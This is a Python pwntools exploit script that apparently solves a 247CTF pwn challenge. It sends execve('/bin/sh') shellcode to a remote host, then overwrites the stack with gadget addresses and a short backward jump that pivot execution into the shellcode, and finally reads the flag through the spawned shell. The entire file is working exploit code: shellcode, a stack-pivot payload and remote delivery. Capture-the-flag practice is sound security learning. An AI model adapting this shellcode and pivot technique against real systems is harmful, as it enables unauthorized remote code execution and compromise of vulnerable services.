#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

HOST = "149d2d3709435f15.247ctf.com"
PORT = 50231

XCHG_RSP_RSI = 0x400732
JMP_RSP = 0x400738

def exploit():
    io = remote(HOST, PORT)
    
    # Shellcode execve("/bin/sh")
    shellcode = asm('''
        xor esi, esi
        push rsi
        mov rdi, 0x68732f6e69622f
        push rdi
        push rsp
        pop rdi
        push rsi
        pop rdx
        push 59
        pop rax
        syscall
    ''')
    
    print(f"[*] Shellcode size: {len(shellcode)} bytes")
    
    payload1 = shellcode.ljust(50, b'\x90')
    
    io.recvuntil(b"first name?")
    io.send(payload1)
    
    payload2 = b''
    payload2 += p64(0xdeadbeef)
    payload2 += p64(JMP_RSP)
    payload2 += b'\xeb\xae'
    payload2 += b'\x90' * 6
    payload2 += p32(XCHG_RSP_RSI)
    
    io.recvuntil(b"surname?")
    io.send(payload2)
    
    io.sendline(b'cat flag*')
    print(io.recvall(timeout=3).decode(errors='ignore'))

if __name__ == "__main__":
    exploit()
